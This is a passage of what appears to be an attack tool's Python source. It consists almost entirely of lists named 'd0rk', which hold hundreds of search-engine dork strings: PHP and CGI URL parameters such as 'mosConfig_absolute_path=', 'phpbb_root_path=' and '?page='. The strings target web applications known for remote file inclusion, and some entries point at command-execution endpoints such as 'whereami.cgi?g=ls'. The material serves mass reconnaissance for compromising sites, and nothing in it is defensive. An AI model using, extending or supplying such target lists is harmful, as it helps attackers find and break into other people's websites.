'index1.php?texto=', 'start.php?pg=', 'index1.php?showpage=', 'info.php?go=', 'path.php?load=', 'index3.php?abre=', 'blank.php?where=', 'info.php?start=', 'page.php?secao=', 'nota.php?pag=', 'nota.php?second=', 'index2.php?to=', 'standard.php?name=', 'start.php?strona=', 'mod*.php?numero=', 'press.php?home=', 'info.php?z=', 'mod*.php?path=', 'blank.php?base_dir=', 'base.php?texto=', 'nota.php?secc=', 'index.php?tipo=', 'index.php?goto=', 'print.php?pag=', 'view.php?secao=', 'general.php?strona=', 'show.php?my=', 'page.php?e=', 'padrao.php?index=', 'gery.php?thispage=', 'start.php?base_dir=', 'default.php?tipo=', 'gery.php?panel=', 'standard.php?ev=', 'standard.php?destino=', 'general.php?middle=', 'main.php?basepath=', 'standard.php?q=', 'index1.php?tipo=', 'mod*.php?choix=', 'template.php?ir=', 'show.php?adresa=', 'general.php?mid=', 'index3.php?adresa=', 'pagina.php?sec=', 'template.php?secao=', 'home.php?w=', 'general.php?content=', 'sub*.php?recipe=', 'main.php?category=', 'enter.php?viewpage=', 'main.php?ir=', 'show.php?pageweb=', 'principal.php?ir=', 'default.php?pageweb=', 'index.php?oldal=', 'head.php?d=', 'gery.php?mid=', 'index.php?type=', 'standard.php?j=', 'show.php?oldal=', 'enter.php?link=', 'enter.php?content=', 'blank.php?filepath=', 'standard.php?channel=', 'base.php?*[*]*=', 'info.php?incl=', 'down*.php?include=', 'press.php?modo=', 'file.php?choix=', 'press.php?type=', 'blank.php?goto=', 'index3.php?showpage=', 'principal.php?subject=', 'start.php?chapter=', 'show.php?r=', 'pagina.php?thispage=', 'general.php?chapter=', 'page.php?base_dir=', 'page.php?qry=', 'show.php?incl=', 'page.php?*[*]*=' ]
d0rk += [ 'main.php?h=', 'file.php?seccion=', 'default.php?pre=', 'principal.php?index=', 'principal.php?inc=', 'home.php?z=', 'pagina.php?in=', 'show.php?play=', 'nota.php?subject=', 'default.php?secc=', 'default.php?loader=', 'padrao.php?var=', 'mod*.php?b=', 'default.php?showpage=', 'press.php?channel=', 'pagina.php?ev=', 'sitio.php?name=', 'page.php?option=', 'press.php?mid=', 'down*.php?corpo=', 'view.php?get=', 'print.php?thispage=', 'principal.php?home=', 'show.php?param=', 'standard.php?sivu=', 'index3.php?panel=', 'include.php?play=', 'path.php?cmd=', 'file.php?sp=', 'template.php?section=', 'view.php?str=', 'blank.php?left=', 'nota.php?lang=', 'path.php?sivu=', 'main.php?e=', 'default.php?ref=', 'start.php?seite=', 'default.php?inc=', 'print.php?disp=', 'home.php?h=', 'principal.php?loc=', 'index3.php?sp=', 'gery.php?var=', 'sub*.php?base_dir=', 'path.php?middle=', 'pagina.php?str=', 'base.php?play=', 'base.php?v=', 'sitio.php?sivu=', 'main.php?r=', 'file.php?nivel=', 'start.php?sivu=', 'template.php?c=', 'general.php?second=', 'sub*.php?mod=', 'home.php?loc=', 'head.php?corpo=', 'standard.php?op=', 'index2.php?inc=', 'info.php?pref=', 'base.php?basepath=', 'print.php?basepath=', '*inc*.php?m=', 'base.php?home=', 'layout.php?strona=', 'padrao.php?url=', 'sitio.php?oldal=', 'pagina.php?read=', 'index1.php?go=', 'standard.php?s=', 'page.php?eval=', 'index.php?j=', 'pagina.php?pr=', 'start.php?secao=', 'template.php?*[*]*=', 'nota.php?get=', 'index3.php?link=', 'home.php?e=', 'gery.php?name=', 'nota.php?eval=', 'sub*.php?abre=', 'index2.php?load=', 'principal.php?in=', 'view.php?load=', 'mod*.php?action=', 'default.php?p=', 'head.php?c=', 'template.php?viewpage=', 'view.php?mid=', 'padrao.php?addr=', 'view.php?go=', 'file.php?basepath=', 'home.php?pre=', 'include.php?goFile=', 'layout.php?play=', 'index1.php?subject=', 'info.php?middlePart=', 'down*.php?pg=', 'sub*.php?body=', 'index.php?option=', 'sub*.php?chapter=', 'default.php?t=', 'head.php?opcion=', 'nota.php?panel=', 'sitio.php?left=', 'show.php?include=', 'pagina.php?start=', 'head.php?choix=', 'index3.php?tipo=', 'index3.php?choix=', 'down*.php?channel=', 'base.php?pa=', 'nota.php?sekce=', 'show.php?l=', 'show.php?index=', 'blank.php?url=', 'start.php?thispage=', 'nota.php?play=', 'show.php?second=', 'enter.php?include=', 'principal.php?middle=', 'main.php?where=', 'padrao.php?link=', 'path.php?strona=', 'index3.php?read=', 'mod*.php?module=', 'standard.php?viewpage=', 'standard.php?pr=', '*inc*.php?showpage=', 'pagina.php?ref=', 'path.php?pname=', 'padrao.php?mid=', 'info.php?eval=', 'include.php?path=', 'page.php?subject=', 'sub*.php?qry=', 'head.php?module=', 'nota.php?opcion=', 'head.php?abre=', 'base.php?str=', 'home.php?body=', 'gery.php?module=', 'head.php?sivu=', 'page.php?inc=', 'pagina.php?header=', 'mod*.php?v=', 'home.php?doshow=', 'padrao.php?n=', 'index1.php?chapter=', 'padrao.php?basepath=', 'index.php?r=', 'index3.php?seccion=' ]
d0rk += [ 'sitio.php?mid=', 'index.php?where=', 'general.php?type=', 'pagina.php?goto=', 'page.php?pa=', 'default.php?menue=', 'main.php?goto=', 'index1.php?abre=', 'info.php?seccion=', 'index2.php?pa=', 'layout.php?pageweb=', 'nota.php?disp=', 'index1.php?body=', 'default.php?nivel=', 'show.php?header=', 'down*.php?pag=', 'start.php?tipo=', 'standard.php?w=', 'index.php?open=', 'blank.php?menu=', 'general.php?nivel=', 'padrao.php?nivel=', '*inc*.php?addr=', 'index.php?var=', 'home.php?redirect=', '*inc*.php?link=', '*inc*.php?incl=', 'padrao.php?corpo=', 'down*.php?url=', 'enter.php?goto=', 'down*.php?addr=', 'sub*.php?j=', 'principal.php?f=', 'sub*.php?menue=', 'index2.php?section=', 'general.php?my=', 'head.php?loader=', 'general.php?goto=', 'include.php?dir=', 'start.php?header=', 'blank.php?in=', 'base.php?name=', 'nota.php?goFile=', 'head.php?base_dir=', 'mod*.php?recipe=', 'press.php?pr=', 'padrao.php?*[*]*=', 'layout.php?opcion=', 'print.php?rub=', 'index.php?pr=', 'general.php?seite=', 'pagina.php?numero=', '*inc*.php?pg=', 'nota.php?rub=', 'view.php?seite=', 'pagina.php?recipe=', 'index.php?pref=', 'page.php?action=', 'page.php?ev=', 'show.php?ir=', 'head.php?index=', 'mod*.php?pname=', 'view.php?ir=', '*inc*.php?start=', 'principal.php?rub=', 'principal.php?corpo=', 'padrao.php?middle=', 'base.php?pname=', 'template.php?header=', 'view.php?sp=', 'main.php?name=', 'nota.php?m=', 'blank.php?open=', 'head.php?dir=', 'page.php?pname=', '*inc*.php?k=', 'index.php?pollname=', 'head.php?oldal=', 'index1.php?str=', 'template.php?choix=', 'down*.php?pollname=', 'page.php?recipe=', 'template.php?corpo=', 'nota.php?sec=', 'info.php?*[*]*=', 'sub*.php?*[*]*=', 'page.php?q=', 'index1.php?type=', 'gery.php?y=', 'standard.php?lang=', 'gery.php?page=', 'index.php?action=', 'press.php?pname=', 'down*.php?v=', 'index3.php?second=', 'show.php?recipe=', 'main.php?pre=', 'file.php?numero=', 'print.php?str=', 'standard.php?link=', 'nota.php?OpenPage=', 'view.php?pollname=', 'print.php?l=', 'index.php?go=', 'standard.php?numero=', 'view.php?pr=', 'down*.php?read=', 'down*.php?action=', 'index1.php?OpenPage=', 'principal.php?left=', 'mod*.php?start=', 'file.php?body=', 'gery.php?pg=', 'blank.php?qry=', 'base.php?eval=', 'default.php?left=', 'gery.php?param=', 'blank.php?pa=', 'nota.php?b=', 'path.php?loader=', 'start.php?o=', 'include.php?include=', 'nota.php?corpo=', 'enter.php?second=', 'sub*.php?pname=', 'mod*.php?pageweb=', 'principal.php?addr=', 'standard.php?action=', 'template.php?lang=', 'include.php?basepath=', 'sub*.php?ir=', 'down*.php?nivel=', 'path.php?opcion=', 'print.php?category=', 'print.php?menu=', 'layout.php?secao=', 'template.php?param=', 'standard.php?ref=', 'base.php?include=', 'blank.php?body=', 'path.php?pref=', 'print.php?g=', 'padrao.php?subject=', 'nota.php?modo=', 'index3.php?loader=', 'template.php?seite=', 'general.php?pageweb=', 'index2.php?param=', 'path.php?nivel=', 'page.php?pref=' ]
d0rk += [ 'press.php?pref=', 'enter.php?ev=', 'standard.php?middle=', 'index2.php?recipe=', 'blank.php?dir=', 'home.php?pageweb=', 'view.php?panel=', 'down*.php?home=', 'head.php?ir=', 'mod*.php?ir=', 'show.php?pagina=', 'default.php?base_dir=', 'show.php?loader=', 'path.php?mid=', 'blank.php?abre=', 'down*.php?choix=', 'info.php?opcion=', 'page.php?loader=', 'principal.php?oldal=', 'index1.php?load=', 'home.php?content=', 'pagina.php?sekce=', 'file.php?n=', 'include.php?redirect=', 'print.php?itemnav=', 'enter.php?index=', 'print.php?middle=', 'sitio.php?goFile=', 'head.php?include=', 'enter.php?e=', 'index.php?play=', 'enter.php?id=', 'view.php?mod=', 'show.php?nivel=', 'file.php?channel=', 'layout.php?choix=', 'info.php?body=', 'include.php?go=', 'index3.php?nivel=', 'sub*.php?include=', 'path.php?numero=', 'principal.php?header=', 'main.php?opcion=', 'enter.php?s=', 'sub*.php?pre=', 'include.php?index=', 'gery.php?pageweb=', 'padrao.php?path=', 'info.php?url=', 'press.php?ev=', 'index1.php?pg=', 'print.php?in=', 'general.php?modo=', 'head.php?ki=', 'press.php?my=', 'index1.php?pollname=', 'principal.php?to=', 'default.php?play=', 'page.php?g=', 'nota.php?pg=', 'blank.php?destino=', 'blank.php?z=', 'components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=', 'module_db.php?pivot_path= module_db.php?pivot_path="', '/classes/adodbt/sql.php?classes_dir= /classes/adodbt/sql.php?classes_dir="', 'components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=', 'com_extended_registration', 'smarty_config.php?root_dir= "smarty"', 'include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= site:.gr', 'send_reminders.php?includedir= "send_reminders.php?includedir="', 'components/com_rsgery/rsgery.html.php?mosConfig_absolute_path= com_rsgery', 'inc/functions.inc.php?config[ppa_root_path]= "Index - Albums" index.php', '/components/com_cpg/cpg.php?mosConfig_absolute_path= com_cpg"', '[Script Path]/admin/index.php?o= admin/index.php";', '/admin/index.php?o= admin/index.php";', '/modules/coppermine/themes/coppercop/theme.php?THEME_DIR= coppermine', '/components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= com_extcalendar', 'admin/doeditconfig.php?thispath=../includes&config[path]= "admin"', '/components/com_simpleboard/image_upload.php?sbp= com_simpleboard"', 'components/com_simpleboard/image_upload.php?sbp= com_simpleboard"', '/modules/coppermine/themes/coppercop/theme.php?THEME_DIR= coppermine', 'mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=', 'zentrack/index.php?configFile=', 'inst/index.php?lng=../../include/main.inc&G_PATH=', 'pivot/modules/module_db.php?pivot_path=', 'include/write.php?dir=', 'includes/header.php?systempath=', 'becommunity/community/index.php?pageurl=', 'agendax/addevent.inc.php?agendax_path=', 'myPHPCalendar/admin.php?cal_dir=', 'yabbse/Sources/Packages.php?sourcedir=', 'zboard/zboard.php', 'path_of_cpcommerce/_functions.php?prefix' ]
d0rk += [ 'dotproject/modules/projects/addedit.php?root_dir=', 'dotproject/modules/projects/view.php?root_dir=', 'dotproject/modules/projects/vw_files.php?root_dir=', 'dotproject/modules/tasks/addedit.php?root_dir=', 'dotproject/modules/tasks/viewgantt.php?root_dir=', 'My_eGery/public/displayCategory.php?basepath=', 'modules/My_eGery/public/displayCategory.php?basepath=', 'modules/4nAlbum/public/displayCategory.php?basepath=', 'modules/coppermine/themes/default/theme.php?THEME_DIR=', 'modules/agendax/addevent.inc.php?agendax_path=', 'modules/xoopsgery/upgrade_album.php?GERY_BASEDIR=', 'modules/xgery/upgrade_album.php?GERY_BASEDIR=', 'modules/coppermine/include/init.inc.php?CPG_M_DIR=', 'shoutbox/expanded.php?conf=', 'library/editor/editor.php?root=', 'library/lib.php?root=', 'e107/e107_handlers/secure_img_render.php?p=', 'main.php?x=', '*default.php?page=', '*default.php?body=', '*index.php?url=', '*index.php?arquivo=', 'index.php?include=', 'index.php?visualizar=', 'index.php?pagina=', 'index.php?page=', 'index.php?p=', 'index.php?cont=', 'index.php?x=', 'index.php?cat=', 'index.php?site=', 'index.php?configFile=', 'index.php?do=', 'index2.php?x=', 'Index.php?id=', 'template.php?pagina', 'inc/step_one_tables.php?server_inc=', 'GradeMap/index.php?page=', 'admin.php?cal_dir=', 'path_of_cpcommerce/_functions.php?prefix=', 'contacts.php?cal_dir=', 'convert-date.php?cal_dir=', 'album_portal.php?phpbb_root_path=', 'mainfile.php?MAIN_PATH=', 'dotproject/modules/files/index_table.php?root_dir=', 'gery/init.php?HTTP_POST_VARS=', 'pm/lib.inc.php?pm_path=', 'ideabox/include.php?gorumDir=', 'cgi-bin/index.cgi?page=', 'cgi-bin/awstats.pl?update=1&logfile=', 'cgi-bin/awstats/awstats.pl?configdir', 'cgi-bin/ikonboard.cgi', 'cgi-bin/acart/acart.pl?&page=', 'cgi-bin/quikstore.cgi?category=', 'cgi-bin/ubb/ubb.cgi?g=', 'cgi-bin/hinsts.pl?', 'cgi-bin/bp/bp-lib.pl?g=', 'ccbill/whereami.cgi?g=ls', 'cgi-bin/telnet.cgi', 'cgi-bin/1/cmd.cgi', 'calendar.pl?command=login&fromTemplate=', 'encore/forumcgi/display.cgi?preftemp=temp&page=anonymous&file=', 'events.cgi?t=', 'powerup.cgi?a=latest&t=', 'lc.cgi?a=', 'news.cgi?a=114&t=', 'biznews.cgi?a=33&t=', 'jobs.cgi?a=9&t=', 'articles.cgi?a=34&t=', 'events.cgi?a=155&t=', 'latinbitz.cgi?t=', 'newsdesk.cgi?t=', 'media.cgi?a=11&t=', 'reporter.cgi?t=', 'news.cgi?t=', 'newsupdate.cgi?a=latest&t=', 'deportes.cgi?a=latest&t=', 'news.cgi?a=latest&t=', 'whereami.cgi?g=id', 'auktion.pl?menue=', 'i-m/i-m.cgi?p=', 'vote.pl?action=show&id=', 'shop.pl/page=', 'newsdesk.cgi?a=latest&t=', 'fileseek.cgi?head=&foot=', 'cgi-bin/probe.cgi?olddat=', 'emsgb/easymsgb.pl?print=', 'app/webeditor/login.cgi?username=&command=simple&do=edit&password=&file=', 'csv_db/csv_db.cgi?fil e=file.extention', 'cgi-bin/jammail.pl?job=showoldmail&mail=', 'cgi-bin/bbs/read.cgi?file=', 'support_page.cgi?file_name=', 'index.php?include=', 'index.php?open=', 'index.php?visualizar=', 'main.php?x=', 'main.php?page=', 'index.php?meio.php=' ]
d0rk += [ 'index.php?page=', 'index.php?action=', 'index5.php?configFile=', 'index5.php?page=', 'index5.php?content=', 'index5.php?x=', 'index5.php?open=', 'index5.php?m=', 'index5.php?site=', 'index5.php?cat=', 'index.php?d=', 'index.php?a=', 'index.php?b=', 'index.php?c=', 'index.php?e=', 'index.php?f=', 'index.php?g=', 'index.php?h=', 'index.php?i=', 'index.php?j=', 'index.php?k=', 'index.php?l=', 'index.php?m=', 'index.php?n=', 'index.php?o=', 'index.php?p=', 'index.php?q=', 'index.php?r=', 'index.php?s=', 'index.php?t=', 'index.php?u=', 'index.php?v=', 'index.php?x=', 'index.php?y=', 'index.php?z=', 'index.php?loc=', 'index.php?seite=', 'index2.php?d=', 'index2.php?a=', 'index.php?ir=', 'index.php?secao=', 'index2.php?b=', 'index2.php?c=', 'index2.php?e=', 'index2.php?f=', 'index2.php?g=', 'index2.php?h=', 'index2.php?i=', 'index2.php?j=', 'index2.php?k=', 'index2.php?l=', 'index2.php?m=', 'index2.php?n=', 'index2.php?o=', 'index2.php?p=', 'index2.php?q=', 'index2.php?r=', 'index2.php?s=', 'index2.php?t=', 'index2.php?u=', 'index2.php?v=', 'index2.php?x=', 'index2.php?y=', 'index2.php?z=', 'index5.php?inc=', 'index5.php?pg=', 'index5.php?lv1=', 'index.php?sub=', 'index.php?sub2=', 'index.php?pg=', 'index.php?lv1=', 'index.php?directfile=', 'index.php?funcion=', 'index.php?ll=', 'index.php?lnk=', 'index5.php?main=', 'index5.php?include=', 'index5.php?root=', 'index5.php?pagina=', 'index.php?theme=', 'index.php?acao=', 'index5.php?cont=', 'index5.php?pag=', 'index5.php?p=', 'index5.php?lang=', 'index5.php?language=', 'template.php?pagina=', 'llindex.php?sub=', 'index2.php?pg=', 'index2.php?lv1=', 'index2.php?sub=', 'index2.php?directfile=', 'index2.php?funcion=', 'index2.php?sub2=', 'index2.php?ll=', 'index2.php?lnk=', 'index5.php?body=', 'index5.php?visualizar=', 'index5.php?do=', 'index2.php?theme=', 'index2.php?acao=', 'index2:php?aa=', 'index3:php?aa=', 'index.php?server=', 'index.php?cal=', 'index.php?prefix=', 'index.php?root_PATH=', 'index.php?path=', 'index.php?gorumdir=', 'index2.php?cont=', 'index2.php?server=', 'index2.php?cal=', 'index2.php?prefix=', 'index2.php?root_PATH=', 'index2.php?path= AKI', 'exibir.php?abre=', 'exibir.php?page=', 'exibir.php?get=', 'exibir.php?p=', 'exibir.php?lang=', 'index2.php?gorumdir=', 'index2.php?pag=', 'index2.php?lang=', 'index2.php?language=', 'index2.php?content=', 'index.php?middle=', 'step_one_tables.php?server_inc=', 'grademade/index.php?page=', 'phpshop/index.php?base_dir=', 'admin.php?cal_dir=', '_functions.php?prefix=', 'contacts.php?cal_dir=', 'convert-date.php?cal_dir=', 'album_portal.php?phpbb_root_path=', 'mainfile.php?MAIN_PATH=', 'index_table.php?root_dir=', 'affich.php?base=', 'init.php?HTTP_POST_VARS=', 'lib.inc.php?pm_path=', 'include.php?gorumDir=', 'start_lobby.php?CONFIG[MWCHAT_Libs]=', 'index.php?configFile=', 'module_db.php?pivot_path=', 'index.php?lng=../../include/main.inc&G_PATH=', 'initdb.php?absolute_path=', 'step_one.php?server_inc=' ]
d0rk += [ 'pipe.php?HCL_path=', 'write.php?dir=', 'new-visitor.inc.php?lvc_include_dir=', 'header.php?systempath=', 'theme.php?THEME_DIR=', 'index.php?pageurl=', 'expanded.php?conf=', 'addevent.inc.php?agendax_path=', 'Packages.php?sourcedir=', '_functions.php?prefix', 'addedit.php?root_dir=', 'view.php?root_dir=', 'vw_files.php?root_dir=', 'viewgantt.php?root_dir=', 'displayCategory.php?basepath=', 'default/theme.php?THEME_DIR=', 'upgrade_album.php?GERY_BASEDIR=', 'init.inc.php?CPG_M_DIR=', 'mod_mainmenu.php?mosConfig_absolute_path=', 'editor.php?root=', 'lib.php?root=', 'secure_img_render.php?p=', 'default.php?page=', 'arquivo.php?data=', 'word.php?id=', 'mod.php?mod=', 'index.php?plugin=', 'sendpage.php?page=', 'index.php?hl=', 'modules.php?op=', 'index.php?templateid=', 'article.php?sid=', '.php?my="', '.php?a="', '.php?f="', '.php?z="', '.php?zo="', '.php?la="', '.php?perm="', '.php?item_id="', '.php?f_content="', '.php?from="', '.php?mid="', '.php?lest="', '.php?east="', '.gov.br/index.php?arquivo=', 'index.php?ver=', '/contenido/classes/class.inuse.php', 'news.php?CONFIG[script_path]=', 'index.php?vpagina=', 'index.php?arq=', 'index.php?pg_ID=', 'index.php?pg=', 'home.php?page=', '*/newbb/print.php?forum=*topic_id=*"', '*/newbb_plus/*="', '*/news/archive.php?op=*year=*month=*"', '.php?abrir="', '.php?act="', '.php?action="', '.php?ad="', '.php?archive="', '.php?area="', '.php?article="', '.php?b="', '*/tsep/include/colorswitch.php?tsep_config[absPath]=*"', '.php?back="', '.php?base="', '.php?basedir="', '.php?bbs="', '.php?board_no="', '.php?body="', '.php?c="', '.php?cal_dir="', '.php?cat="', '/include/init.inc.php?CPG_M_DIR="', '/includes/mx_functions_ch.php?phpbb_root_path="', '/modules/MyGuests/signin.php?_AMGconfig[cfg_serverpath]="', '.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path="', '.php?subd="', '.php?subdir="', '.php?category="', '.php?choice="', '.php?class="', '.php?club_id="', '.php?cod.tipo="', '.php?cod="', '.php?conf="', '.php?configFile="', '.php?cont="', '.php?corpo="', '.php?cvsroot="', '.php?d="', '.php?da="', '.php?date="', '.php?debug="', '.php?debut="', '.php?default="', '.php?destino="', '.php?dir="', '.php?display="', '.php?file_id="', '.php?file="', '.php?filepath="', '.php?flash="', '.php?folder="', '.php?for="', '.php?form="', '.php?formatword="', '.php?funcao="', '.php?function="', '.php?g="', '.php?get="', '.php?go="', '.php?gorumDir="', '.php?goto="', '.php?h="', '.php?headline="', '.php?i="', '.php?inc="', '.php?include="', '.php?includedir="', '.php?inter="', '.php?itemid="', '.php?j="', '.php?join="', '.php?jojo="', '.php?l="', '.php?lan="', '.php?lang="', '.php?link="', '.php?load="', '.php?loc="', '.php?m="', '.php?main="', '.php?meio.php="', '.php?meio="', '.php?menu="', '.php?menuID="', '.php?mep="', '.php?month="', '.php?mostra="', '.php?n="', '.php?name="', '.php?nav="', '.php?new="', '.php?news="', '.php?next="' ]
d0rk += [ '.php?nextpage="', '.php?o="', '.php?op="', '.php?open="', '.php?option="', '.php?origem="', '.php?Page_ID="', '.php?pageurl="', '.php?para="', '.php?part="', '.php?pg="', '.php?pid="', '.php?place="', '.php?play="', '.php?plugin="', '.php?pm_path="', '.php?pollname="', '.php?post="', '.php?pr="', '.php?prefix="', '.php?prefixo="', '.php?q="', '.php?redirect="', '.php?ref="', '.php?refid="', '.php?regionId="', '.php?release_id="', '.php?release="', '.php?return="', '.php?root="', '.php?S="', '.php?searchcode_id="', '.php?sec="', '.php?secao="', '.php?sect="', '.php?sel="', '.php?server="', '.php?servico="', '.php?sg="', '.php?shard="', '.php?show="', '.php?sid="', '.php?site="', '.php?sourcedir="', '.php?start="', '.php?storyid="', '.php?str="', '.php?subject="', '.php?sufixo="', '.php?systempath="', '.php?t="', '.php?task="', '.php?teste="', '.php?theme_dir="', '.php?thread_id="', '.php?tid="', '.php?title="', '.php?to="', '.php?topic_id="', '.php?type="', '.php?u="', '.php?url="', '.php?urlFrom="', '.php?v="', '.php?var="', '.php?vi="', '.php?view="', '.php?visual="', '.php?wPage="', '.php?y="', '/components/com_forum/download.php?phpbb_root_path= com_forum', '[Script Path]/admin/index.php?o= admin/index.php"', '/admin/index.php?o= admin/index.php"', 'index.php?menu=deti&page= index.php?menu=deti&page"', 'include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= intitle:Newswriter', '/classes/adodbt/sql.php?classes_dir= "index2.php?option=rss"', 'components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= com_extended_registration', 'index.php?RP_PATH= reviewpost', 'index.php?pagename= phpquiz', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= /com_remository/', '/components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= com_extcalendar', 'components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "com_phpshop"', '/tools/send_reminders.php?includedir= day.php?date=', 'SQuery/lib/gore.php?libpath= "/SQuery/"', 'm2f/m2f_phpbb204.php?m2f_root_path= /m2f_usercp.php?', 'wamp_dir/setup/yesno.phtml?no_url= "setup"', 'components/com_forum/download.php?phpbb_root_path= "com_forum"', 'index.php?p= "/index.php?p=*.php"', 'index.php?pag= "/index.php?pag=*.php"', 'template.php?page= "/template.php?page=*.php"', 'main.php?page= "/main.php?page=*.php"', 'index2.php?pag= "/index2.php?pag=*.php"', 'home.php?pag= "/home.php?pag=*.php"', 'index.php?page= "/index.php?page=*.php"', 'default.php?page= "/default.php?page=*.php"', 'inc/cmses/aedatingCMS.php?dir[inc]= "flashchat"', '/modules/vwar/admin/admin.php?vwar_root= vwar', 'bb_usage_stats/include/bb_usage_stats.php?phpbb_root_path= forum', 'encapscms_PATH/core/core.php?root= encapscms_PATH', 'inc/session.php?sessionerror=0&lang= inc', 'path/index.php?function=custom&custom= path', '[MyAlbum_DIR]/language.inc.php?langs_dir= [MyAlbum_DIR]', '/inc/irayofuncs.php?irayodirhack= "/inc/"']
d0rk += [ 'index.php?function=custom&custom= custom', 'cyberfolio/portfolio/msg/view.php?av= cyberfolio', '/modules/kernel/system/startup.php?CFG_PHPGIGGLE_ROOT= CFG_PHPGIGGLE_ROOT', '*mwchat/libs/start_lobby.php?CONFIG[MWCHAT_Libs]=', '*pivot/modules/module_db.php?pivot_path=', '*inc/header.php/step_one.php?server_inc=', '*inst/index.php?lng=../../include/main.inc&G_PATH=', '*inc/pipe.php?HCL_path=', '*include/new-visitor.inc.php?lvc_include_dir=', '*includes/header.php?systempath=', '*support/mailling/maillist/inc/initdb.php?absolute_path=', '*coppercop/theme.php?THEME_DIR=', '*zentrack/index.php?configFile=', '*include/write.php?dir=', 'include/new-visitor.inc.php?lvc_include_dir=', 'includes/header.php?systempath=', 'support/mailling/maillist/inc/initdb.php?absolute_path=', 'coppercop/theme.php?THEME_DIR=', 'becommunity/community/index.php?pageurl=', 'shoutbox/expanded.php?conf=', 'agendax/addevent.inc.php?agendax_path=', 'myPHPCalendar/admin.php?cal_dir=', 'yabbse/Sources/Packages.php?sourcedir=', 'zboard/zboard.php', 'path_of_cpcommerce/_functions.php?prefix', 'dotproject/modules/tasks/viewgantt.php?root_dir=', 'My_eGery/public/displayCategory.php?basepath=', 'modules/My_eGery/public/displayCategory.php?basepath=', 'modules/4nAlbum/public/displayCategory.php?basepath=', 'modules/coppermine/themes/default/theme.php?THEME_DIR=', 'modules/agendax/addevent.inc.php?agendax_path=', 'modules/xoopsgery/upgrade_album.php?GERY_BASEDIR=', 'modules/xgery/upgrade_album.php?GERY_BASEDIR=', 'modules/coppermine/include/init.inc.php?CPG_M_DIR=', 'modules/mod_mainmenu.php?mosConfig_absolute_path=', 'pivot/modules/module_db.php?pivot_path=', 'library/editor/editor.php?root=', 'library/lib.php?root=', 'e107/e107_handlers/secure_img_render.php?p=', 'main.php?x=', 'main.php?page=', '*default.php?page=', '*default.php?body=', 'default.php?page=', '*index.php?url=', '*index.php?arquivo=', 'index.php?meio.php=', 'index.php?include=', 'index.php?open=', 'index.php?visualizar=', 'index.php?pagina=', 'index.php?inc=', 'index.php?page=', 'index.php?pag=', 'index.php?p=', 'index.php?content=', 'index.php?cont=', 'index.php?c=', 'index.php?meio=', 'index.php?x=', 'index.php?cat=', 'index.php?site=', 'index.php?configFile=', 'index.php?action=', 'index.php?do=', 'index2.php?x=', 'Index.php?id=', 'index2.php?content=', 'template.php?pagina', 'inc/step_one_tables.php?server_inc=', 'phpshop/index.php?base_dir=', 'admin.php?cal_dir=', 'path_of_cpcommerce/_functions.php?prefix=', 'contacts.php?cal_dir=', 'convert-date.php?cal_dir=', 'album_portal.php?phpbb_root_path=', 'mainfile.php?MAIN_PATH=', 'dotproject/modules/files/index_table.php?root_dir=', 'html/affich.php?base=', 'gery/init.php?HTTP_POST_VARS=', 'pm/lib.inc.php?pm_path=', 'ideabox/include.php?gorumDir=', 'modules/tasks/viewgantt.php?root_dir=', 'cgi-bin/index.cgi?page=', 'cgi-bin/awstats.pl?update=1&logfile=', 'cgi-bin/awstats/awstats.pl?configdir', 'cgi-bin/ikonboard.cgi', 'cgi-bin/acart/acart.pl?&page=']
d0rk += [ 'cgi-bin/quikstore.cgi?category=', 'cgi-bin/ubb/ubb.cgi?g=', 'cgi-bin/hinsts.pl?', 'cgi-bin/bp/bp-lib.pl?g=', 'ccbill/whereami.cgi?g=ls', 'cgi-bin/telnet.cgi', 'cgi-bin/1/cmd.cgi', 'encore/forumcgi/display.cgi?preftemp=temp&page=anonymous&file=', 'cgi-sys/guestbook.cgi?user=cpanel&template=', 'account.php?action= account.php?action=', 'account.php?action= iurl:"account.php?action="', 'account.php?action= iurl:".php?action="', 'account.php?action= .php?action=', 'accounts.php?command= .php?command="', 'addmedia.php?factsfile[$LANGUAGE]= phpGedView', '.php?p="', 'announcements.php?phpraid_dir= "phpraid"', 'announcements.php?phpraid_dir= "phpraid signup"', 'announcements.php?phpraid_dir= php raid', 'announcements.php?phpraid_dir= phpraid', 'announcements.php?phpraid_dir= phpraid signup', 'arg.php?arg= .php?arg=', 'args.php?arg= .php?arg=', 'atom.php5?page= .php5?id=', 'auto.php?inc= .php?inc="', 'auto.php?page= auto.php?page=', 'base.php?f1= base.php?f1="', 'base.php?f1= .php?f1="', 'board.php?see= board.php?see="', 'board.php?see= .php?see="', 'book.php5?page= php5?page=', '/calendar.php?l= calendar.php?l="', '/calendar.php?l= calendar.php?l=', '/calendar.php?p= calendar.php?p="', '/calendar.php?p= calendar.php?p=', '/calendar.php?pg= calendar.php?pg="', '/calendar.php?pg= calendar.php?pg=', '/calendar.php?s= calendar.php?s="', '/calendar.php?s= calendar.php?s=', '/addpost_newpoll.php?addpoll=preview&thispath= /ubbthreads/"', '/addpost_newpoll.php?addpoll=preview&thispath= /ubbthreads/', '/addpost_newpoll.php?addpoll=preview&thispath= "/ubbthreads/"', '/addpost_newpoll.php?addpoll=preview&thispath= "ubbthreads"', '/addpost_newpoll.php?addpoll=preview&thispath= ubbthreads', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository"', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= com_remository', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= index.php?option=com_remository', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "Mambo"', 'administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= Mambo', '/administrator/components/com_serverstat/inst.serverstat.php?mosConfig_absolute_path= com_serverstat', '/administrator/components/com_serverstat/inst.serverstat.php?mosConfig_absolute_path= "com_serverstat"', 'canal.php?meio= .php?meio="', '/classes/adodbt/sql.php?classes_dir= "adobt"', '/classes/adodbt/sql.php?classes_dir= adobt', 